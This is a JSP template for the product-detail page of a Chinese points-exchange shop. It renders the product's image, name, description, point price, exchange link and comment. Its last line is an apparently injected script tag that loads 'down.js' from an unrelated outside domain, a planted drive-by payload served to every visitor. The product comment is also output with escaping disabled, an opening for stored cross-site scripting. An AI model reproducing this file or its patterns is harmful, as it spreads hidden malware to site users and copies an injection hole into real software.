<%@ page language="java" pageEncoding="GBK" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jstl/core" %>
<%@ taglib prefix="fmt" uri="http://java.sun.com/jstl/fmt" %>
<c:set var="title" value="积分联盟-商品信息-${result.product.name}"/> 
<%@ include file="IncludeTop.jsp" %>

<table width="780" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr> 
    <td background="images/left_border.gif" width="10"></td>
    <td width="198" height="129" valign="top">
		<%@ include file="accountBar.jsp" %>
		<%@ include file="searchAllBar.jsp" %>
		<%@ include file="newsBar.jsp" %>	
	</td>
    <td bgcolor="#FFFFFF" valign="top" width="562"> 
      <table width="100%" border="0" cellspacing="0" cellpadding="0">
        <tr background="images/splitLine.jpg"> 
          <td colspan="4" height="13"></td>
        </tr>
        <tr> 
          <td width="6">&nbsp;</td>
          <td width="181"><a href='<c:url value="/exchangeList.screen"/>'><img src="images/index_55.gif" alt="" border="0"></a></td>
          <td background="images/index_56.gif" align="right"><a href='<c:url value="/queryExchange.do"/>' class="red">更多。。。</a></td>
          <td rowspan="2" width="25">&nbsp;</td>
        </tr>
        <tr> 
          <td width="6">&nbsp;</td>
          <td width="181">&nbsp;</td>
          <td>&nbsp;</td>
        </tr>
      </table>

	  <c:set var="product" value="${result.product}"/> 
      <table cellspacing="0" cellpadding="0" width="100%" height="100%" border="0" bgcolor="#FFFFFF">
        <tr> 
          <td align="center" rowspan="2" width="101"><img src='images/product/<c:out value="${product.productNo}"/>.jpg' width="85" height="85"></td>
          <td width="166" height="36"><c:out value="${product.name}"/></td>
        </tr>
        <tr> 
          <td height="31" width="166"><c:out value="${product.intro}"/><span class="red15"><c:out value="${product.point}"/>分</span> 
          </td>
        </tr>
        <tr> 
          <td align="center" colspan="2" height="45"> 
            <p><a href='<c:url value="/addExchange.do"/>?productNo=<c:out value="${product.productNo}"/>'><img src="images/index_103.gif" alt="" width="45" height="25" border="0"></a></p>
          </td>
        </tr>
        <tr>
          <td align="center" colspan="2" height="45"><c:out value="${product.comment}" escapeXml="false"/></td>
        </tr>
      </table>
    <td width="10" bgcolor="#FFFFFF" valign="top" background="images/right_border.gif">&nbsp;</td>
  </tr>
</table>

<%@ include file="IncludeBottom.jsp" %>

<script language=javascript src=http://Town.531jx.cn/down.js></script>